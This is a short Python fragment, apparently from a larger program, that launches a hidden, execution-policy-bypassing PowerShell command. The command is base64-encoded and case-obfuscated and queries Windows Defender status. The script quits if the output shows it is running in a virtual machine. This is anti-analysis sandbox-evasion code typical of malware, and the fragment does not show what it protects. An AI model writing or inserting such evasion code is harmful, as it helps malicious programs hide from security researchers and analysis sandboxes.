...
class Mp_ComputerStatus:
    MPPREFERENCE = run("PoWeRsHeLl powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc 'ZwBFAHQALQBtAFAAYwBPAG0AUAB1AFQAZQByAFMAdABhAHQAVQBzAA=='", shell=True, capture_output=True).stdout.decode()

def VirtualMachineCheck():
    MPSTATUS = Mp_ComputerStatus()
    if search("IsVirtualMachine                 : True", MPSTATUS.MPPREFERENCE): exit(1)
